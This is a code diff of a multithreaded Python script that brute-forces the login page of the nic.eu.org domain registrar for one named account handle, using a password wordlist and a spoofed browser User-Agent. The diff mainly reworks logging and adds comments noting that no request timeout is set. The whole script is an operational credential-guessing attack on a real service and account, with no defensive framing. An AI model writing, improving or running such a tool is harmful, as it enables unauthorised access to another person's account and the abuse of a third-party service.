@@ -1,34 +1,39 @@
 import sys
 import requests
 import threading
+import logging
 from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
 import time
 import re
 from datetime import datetime
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='[%(asctime)s] %(message)s',
+    datefmt='%H:%M:%S',
+    handlers=[
+        logging.StreamHandler(sys.stdout),
+        logging.FileHandler("brute.log", encoding="utf-8")
+    ]
+)
 
 LOGIN_PAGE = "https://nic.eu.org/arf/en/login/"
 LOGIN_URL = "https://nic.eu.org/arf/en/login/?next=/arf/en/"
 HANDLE = "JA110-FREE"
 PASSWORD_FILE = "weakpass_4.txt"
 FOUND_FLAG = "final.txt"
-LOG_FILE = "brute.log"
 UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari/537.36"
 
 found_event = threading.Event()
 lock = threading.Lock()
 
-
 def log(msg: str, level: str = "info") -> None:
-    now = datetime.now().strftime("%H:%M:%S")
-    line = f"[{now}] {msg}"
-    print(line)
-    try:
-        with lock:
-            with open(LOG_FILE, "a", encoding="utf-8") as f:
-                f.write(line + "\n")
-    except Exception as e:
-        print(f"[!] Failed to write to log file: {e}")
-
+    if level == "error":
+        logging.error(msg)
+    elif level == "warning":
+        logging.warning(msg)
+    else:
+        logging.info(msg)
 
 def check_password(password: str) -> bool:
     if not password.strip():
@@ -41,7 +46,7 @@ def check_password(password: str) -> bool:
     session.headers.update({"User-Agent": UA, "Referer": LOGIN_PAGE})
 
     try:
-        r = session.get(LOGIN_PAGE)
+        r = session.get(LOGIN_PAGE)  # 不设置timeout
         if r.status_code != 200:
             log(f"[!] Failed to load login page, status {r.status_code}")
             return False
@@ -60,7 +65,7 @@ def check_password(password: str) -> bool:
         }
 
         start = time.perf_counter()
-        post_resp = session.post(LOGIN_URL, data=data)
+        post_resp = session.post(LOGIN_URL, data=data)  # 不设置timeout
         elapsed_ms = int((time.perf_counter() - start) * 1000)
 
         pwd_display = password.ljust(20)[:20]
@@ -82,7 +87,6 @@ def check_password(password: str) -> bool:
     except Exception as e:
         log(f"[!] Unexpected exception for password '{password}': {e}")
         return False
-
 
 def main() -> None:
     max_workers = 16
@@ -122,7 +126,6 @@ def main() -> None:
         log(f"\n[✓] Correct password: {pwd}")
     else:
         log("\n[✗] No valid password found.")
-
 
 if __name__ == "__main__":
     main()
